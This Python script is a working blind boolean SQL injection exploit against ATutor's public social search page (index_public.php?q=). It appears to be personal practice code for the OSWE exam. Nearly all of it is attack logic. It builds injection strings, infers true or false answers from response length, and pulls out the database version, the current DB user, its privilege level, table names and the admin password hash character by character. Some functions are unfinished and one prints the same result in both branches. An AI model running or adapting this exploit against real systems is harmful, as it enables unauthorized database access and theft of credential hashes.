import requests
import sys
# original query: SELECT * FROM AT_members M WHERE (first_name LIKE '%aaa%'  OR second_name LIKE '%aaa%'  OR last_name LIKE '%aaa%'  OR login LIKE '%aaa%'  )
# SELECT IF(1=1,(SELECT length(current_user()) > 0),'a');
# SELECT IF(1=1,(SELECT length(current_user()) > 14),'a');
# sudo apt proxy install php5-xdebug is all awe need


def searchFriends_blind(ip, sub_query, debug=False):
    injection_string_truthy = F"test')/**/or/**/(select/**/if(1=1,({sub_query}),1))%23"
    #injection_string_falsy = F"test')/**/or/**/(select/**/if(1=2,({sub_query}),1))%23"
    target = F"http://{ip}/ATutor/mods/_standard/social/index_public.php?q={injection_string_truthy}"
    #print(target)
    r = requests.get(target)
    content_length = int(r.headers['Content-Length'])
    if debug == True:
        print("content length:", content_length)
        print ("reponse", r.content)

    # in burp the content length is 246 but here it's 180, idk why
    # the error condition response content lenght is 20 so our truth condition could be content_length > 20 but i prefer to be exact
    if (content_length == 180):
        return True
    return False
def question(ip, sub_query, debug=False):
    if(searchFriends_blind(ip,sub_query, debug)):
        print(F"\n(+) Result of expression [{sub_query}] is true")
    else:
        print(F"\n(+) Result of expression [{sub_query}] is true")
'''
Realistically instead of a linear search we should use a binary search,
but hey this isn't algorithm analysis.
Note to self it might be practical to have something like that coded up when we do hackerone and oswe exam. Get length is a pretty common operation in exfiltration and reducing the amount of time it takes to search is .... better.
'''
def getLength(ip, sub_query, lowbound, upperbound):
    for i in range(lowbound, upperbound):
        query = F"select/**/length(({sub_query}))={i}"
        if(searchFriends_blind(ip,query,debug=False)):
            print(F"(+) Length of result from expression [{sub_query}]: {i}")
            return i
def getString(ip, sub_query, string_length):
    s_exfil = ''
    for i in range(1, string_length + 1):
        for j in range(32, 126):
            query = F"select/**/ascii(substring(({sub_query}),{i},1))={j}"
            if(searchFriends_blind(ip, query, debug=False)):
                s_exfil += chr(j)
                sys.stdout.write(chr(j))
                sys.stdout.flush()
    print(F"(+) Exfiltrated string from expression [{sub_query}]: {s_exfil}")
    return s_exfil

'''
Everything below here is just experimentation.
The three most essential functions are above.
We with them we can
'''
def extractDBVersion(ip):
    # injection_string = "test')/**/or/**/(select/**/if(1=1,(select/**/ascii(substring((select/**/version()),1,1))=53),1))"
    for i in range(1,20):
        for j in range(32, 126):
            sub_query = F"select/**/ascii(substring((select/**/version()),{i},1))={j}"
            if(searchFriends_blind(ip,sub_query)):
                sys.stdout.write(chr(j))
                sys.stdout.flush()
    print("\n(+) done")
def extractCurrentUserNameLength(ip):
    for i in range(0,32):
        sub_query = F"select/**/length(user())={i}"
        if(searchFriends_blind(ip,sub_query)):
            print("\n(+) Curent user's username is ", i, "characters long.")
            return i
def extractCurrentUsername(ip, username_length):
    username = ''
    for i in range(1,username_length+1):
        for j in range(32, 126):
            sub_query = F"select/**/ascii(substring((select/**/current_user()),{i},1))={j}"
            if(searchFriends_blind(ip,sub_query)):
                username += chr(j)
    print("\n(+) Current DB user is: ", username)   
    print("\n(+) done")
    return username
def currentUserIsDbAdmin(ip, username):
    sub_query = F"SELECT(SELECT/**/COUNT(*)/**/FROM/**/mysql.user/**/WHERE/**/Super_priv/**/='Y'/**/AND/**/current_user='{username}')>1"
    if(searchFriends_blind(ip,sub_query, debug=False)):
        print(F"\n(+) Current DB user {username} has Super Privilege")
    else:
        print(F"\n(+) Current DB user {username} does NOT have Super Privilege")

def getNumberOfTables(ip, lowerbound, upperbound):
    for i in range(lowerbound, upperbound):
        sub_query = F"SELECT/**/(SELECT/**/COUNT(table_name)/**/FROM/**/information_schema.tables)/**/=/**/{i}"
        if(searchFriends_blind(ip,sub_query)):
            print("(+) Database has ", i, " tables")
            return i
def getTableNames(ip, num_tables):
    print("(+) Exfiltrating tables")
    table_names = []
    for i in range(0, num_tables):
        # max chars of a table name in mysql is 64,
        # this is the way lazy and causes an excessive number of requests.
        # The proper way would be to extract the length of each table ahead of time but,
        # I'm not in the mood to write it so.
        table_name = ''
        for j in range(1, 65):
            for k in range(32, 126):
                sub_query=F"SELECT/**/ascii(substring((SELECT/**/table_name/**/FROM/**/information_schema.tables/**/limit/**/{i},1),{j},1))={k}"
                if(searchFriends_blind(ip,sub_query,debug=False)):
                    table_name += chr(k)
        table_names.append(table_name)
    print("(+) Exfiltrated tables", table_names)
    return table_names


def getAdminHashes(ip, user, hash_len):
    for i in range(1,hash_len + 1):
        for j in range(32, 126):
            sub_query = F"select/**/ascii(substring((select/**/password/**/from/**/AT_admins/**/where login='admin'),1,1))='102'"
'''
def getNumberOfDBAdmins(ip):
    pass
def getDbAdmins(ip, num_admins):
    db_admins = []
    for i in range(0, num_admins):
        username = ''
        for j in range(32, 126):
            sub_query = F"select/**/ascii(substring((select/**/current_user/**/from/**/mysql.user/**/where Super_priv='Y'/**/limit 1),1,1))/**/={j}"
            if(searchFriends_blind(ip,sub_query)):
                username += chr(j)
    pass

'''
def main():
    if len(sys.argv) != 2:
        print("(+) usage: %s <target>"  % sys.argv[0])
        print('(+) eg: %s 192.168.121.103'  % sys.argv[0])
        sys.exit(-1)

    ip = sys.argv[1]
    
    db_version_query = "select/**/version()"
    current_user_query = "current_user()"
    admin_hash_query = "select/**/password/**/from/**/AT_admins/**/where/**/login='admin'"

    #temp = getLength(ip,db_version_query,1,20)
    #getString(ip,db_version_query, temp )

    temp = getLength(ip,current_user_query, 1, 20)
    username = getString(ip,current_user_query, temp)

    current_user_is_dbadmin_query = F"SELECT(SELECT/**/COUNT(*)/**/FROM/**/mysql.user/**/WHERE/**/Super_priv/**/='Y'/**/AND/**/current_user='{username}')>1"
    question(ip, current_user_is_dbadmin_query)
    #admin_hash_length = getLength(ip,admin_hash_query, 1, 100)
    #admin_hash = getString(ip, admin_hash_query, admin_hash_length)
    #sub_query = "(select/**/password/**/from/**/AT_admins/**/where login='admin'"

    # old
    #extractDBVersion(ip)
    #username_length = extractCurrentUserNameLength(ip)
    #extractCurrentUsername(ip,username_length)
    #currentUserIsDbAdmin(ip,'root@localhost')
    #num_tables = getNumberOfTables(ip,0,250)
    #getTableNames(ip, num_tables)
    
if __name__ == "__main__":
    main()